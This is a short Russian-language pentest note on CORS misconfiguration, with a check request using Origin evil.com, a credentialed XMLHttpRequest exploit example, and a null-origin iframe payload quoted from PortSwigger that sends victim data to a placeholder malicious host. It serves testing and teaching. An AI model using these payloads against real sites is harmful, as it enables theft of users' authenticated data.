# Cross-Origin Resource Sharing (CORS)

CORS — Сервер указывает, кто (какие критерии) имеет права на доступ к его ресурсу.

Если cors настроен не правильно, или не проверяется, то с домена злоумышленника (встроив соотв код и убедив пользователя перейти на него) можно будет осуществлять запросы к веб-приложению от имени пользователя (Произвести CSRF-атаку).

### Как проверить

Отсылаем запрос с `Origin`:

```
GET /some/resource HTTP/1.1
Host: example.com
Origin: https://evil.com

```

Если в ответ придет `Access-Control-Allow-Origin` с нашим доменом или вообще с `*` — то этот ресурс можно запросить с нашего домена (и да, куки или TLS-сертификат подставятся из браузера, если сервер вернет заголовок `Access-Control-Allow-Credentials: true`). Пример ответа:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

```

### Пример эсплуатации

```markup
<html>
    <body>
        <script>
            var client = new XMLHttpRequest();
            client.withCredentials = true;
            client.open("GET", "https://example.com/some/resource");
            client.send()
            client.onreadystatechange = function() {
                if (this.readyState == this.DONE) {
                    console.log(client.response);
                }
            }
        </script>
    </body>
</html>
```

Иногда допускает `Origin: null`. Как добиться такого origin (из [portswigger](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)):

```markup
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```

### Замечание

Если указан Access-Control-Allow-Credentials: true, то в CORS wildcard (\*) не будут работать

### Настройка

Как подрубить корсы на разных серверах: [https://enable-cors.org/server.html](https://enable-cors.org/server.html)

Nginx:\
(обрати внимание на комменты) [https://gist.github.com/Stanback/7145487](https://gist.github.com/Stanback/7145487)\
[https://medium.com/@hariomvashisth/cors-on-nginx-be38dd0e19df](https://medium.com/@hariomvashisth/cors-on-nginx-be38dd0e19df)
